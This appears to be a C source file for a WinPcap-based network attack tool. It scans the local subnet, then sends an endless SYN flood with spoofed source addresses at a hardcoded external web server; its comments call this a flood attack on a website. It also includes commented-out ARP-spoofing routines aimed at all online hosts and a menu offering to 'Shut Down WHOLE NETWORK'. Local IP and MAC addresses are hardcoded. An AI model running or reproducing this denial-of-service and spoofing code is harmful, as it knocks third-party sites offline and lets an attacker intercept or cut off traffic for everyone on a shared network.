#define HAVE_REMOTE
#include <stdio.h>
#include <pcap.h>
#include "Headers.h"
char *myIP= "10.2.124.31";
char *myMAC="78-45-C4-B8-12-CE";
char * myPhoneMAC="1c:b0:94:bc:0c:f0";
unsigned int  SIZE_PACK_ICMP =(sizeof(MACHeader)+sizeof(IPHeader)+sizeof(ICMPHeader));
unsigned int SIZE_PACK_ARP =(sizeof(MACHeader)+sizeof(ARPHeader));
pcap_if_t * find_interfaces(){
	pcap_if_t * alldevs;
	pcap_if_t * d;
	int i=0;
	printf("finding interfaces...");
	char errbuf[PCAP_ERRBUF_SIZE];
	if(pcap_findalldevs(&alldevs,errbuf)==-1){
		printf("Error:%s\n",errbuf);
		exit(1);
	}
	for(d=alldevs;d;d=d->next){
		printf("\nDevice [ %d ] : ",i);
		if(d->description)	printf("(%s)\n",d->description);
		else printf("(No description available)\n");
		i++;
	}
	if(i==0){
		printf("No interfaces found!");
	}
	return alldevs;
}
pcap_t * openDevice(pcap_if_t * device,unsigned int package_size){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t * fp=pcap_open(device->name,65535,PCAP_OPENFLAG_PROMISCUOUS,1000,NULL,errbuf);
	//pcap_t * fp=pcap_open_live(device->name,65535,0,1000,errbuf);
	if(fp == NULL)
	{
		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", device->name);
		
	}
	return fp;
}
void send_raw_package(pcap_t * fp,u_char * packet,int packet_size,int times=1){
	/* Send down the packet */
	while(times--){
		//rand_source_ip_mac(packet);
		if (pcap_sendpacket(fp, packet, packet_size ) != 0)
		{
			printf("\nError sending the packet: %s\n", pcap_geterr(fp));
			return;
		}
	}
	return;
}
void SYNTest(HostManager & manager,pcap_t * fp){
	printf("SYN_Test Begin:\n");
	while(1){
		printf(".");
		//Sleep(1000);
		int port_rand=rand();
		unsigned int id_rand=rand();
		Host tmp_host=manager.getHost(rand()%(manager.host_number));
		Package pack;
		pack.create(sizeof(MACHeader)+sizeof(IPHeader)+sizeof(TCPHeader)+12);
		MAC_MakePackage(pack,tmp_host.mac,getMAC("d8:49:0b:b8:4a:1b"),MAC_PROTOCOL_TYPE_IP);
		IP_MakePackage(pack,tmp_host.IP,getIP("222.30.60.19"),id_rand,IPPROTO_TCP,sizeof(IPHeader)+sizeof(TCPHeader)+12);
		TCP_MakePackage(pack,port_rand%6000+6000,80,(((ULONG)rand())<<8)+rand());
		for(int i=0;i<100;i++){
			send_raw_package(fp,(u_char *)pack.data,pack.length,1);
			TCP_nextPort(pack);
		}
	}
}
int main(){
	srand((unsigned)time(NULL)); 
	pcap_if_t * alldevs=find_interfaces();
	//char * buff=ICMP_MakePackage(getIP(ARP_ip(0)),getIP("222.30.32.11"),getMAC(ARP_mac(0)),getMAC("D8:49:0B:B8:4a:1b"),0);
	unsigned long temp_ip=getIP("10.2.124.1");
	pcap_t * fp=openDevice(alldevs,SIZE_PACK_ICMP);
	HostManager manager;
	
	//ARP_cheat(fp,getIP("10.2.124.34"),getIP("10.2.124.1"),getMAC("1c:b0:94:bc:0c:f1"),getMAC("1c:b0:94:bc:0c:f0"),getMAC("d8:49:0b:b8:4a:1b"));
	//ARP_cheat(fp,getIP("10.2.124.34"),getIP("10.2.124.1"),getMAC("78-45-C4-B8-12-CE"),getMAC("1c:b0:94:bc:0c:f0"),getMAC("d8:49:0b:b8:4a:1b"));
	HostScan(fp,manager,getIP(myIP),temp_ip,getMAC(myMAC));
	SetColor(3);
	/***********
	以下代码为对所有在线主机进行ARP攻击。
	*/
	/*
	while(1){
		for(int i=0;i<manager.host_number;i++){
			ARP_cheat(fp,manager.getHost(i).IP,getIP("10.2.124.1"),getMAC((myMAC)),manager.getHost(i).mac,getMAC("d8:49:0b:b8:4a:1b"),2);
		}
		//Sleep(10);
	}
	*/
	//以下代码对指定网站进行SYN Flood攻击
	SYNTest(manager,fp);
	//******************//
	int phone_idx=manager.getHostByMAC(getMAC(myPhoneMAC));
	printf("My HTC Phone's ID:%d\n",phone_idx);
	Host * target_host=&manager.host_list[manager.selectHost("Please Select Your TARGET:")];
	Host * gate_host=&manager.host_list[manager.selectHost("Please Select Your GATEWAY/ROUTER:")];
	SetColor(5); 
	char tmp_ip[20];
	IP_toString(target_host->IP,tmp_ip);
	printf("TARGET:%s\n",tmp_ip);
	SetColor(2);
	printf("1.Shut Down Attack\n2.Listen\n3.Shut Down WHOLE NETWORK\n");
	int command_ID;
	scanf_s("%d",&command_ID);
	//ARP_cheat(fp,target_host->IP,gate_host->IP,getMAC(myMAC),target_host->mac,gate_host->mac);
	//ARP_cheat(fp,getIP("10.2.124.34"),getIP("10.2.124.1"),getMAC("78-45-C4-B8-12-CE"),getMAC("1c:b0:94:bc:0c:f0"),getMAC("d8:49:0b:b8:4a:1b"));

	//SetFilter(fp,"arp and ether dst 78:45:C4:B8:12:CE");
	
	/*
	for(int i=0;i<255;i++){
		ARP_MakePackage(pData,ARP_OP_REQUEST,getMAC("78-45-C4-B8-12-CE"),getMAC("ff-ff-ff-ff-ff-ff"),getIP("10.2.124.60"),temp_ip+(i<<24));
		send_raw_package(fp,(u_char *)buff,package_size,1);
		
	}
	*/
	//while(1){package_Receive(fp);}
	return 0;
}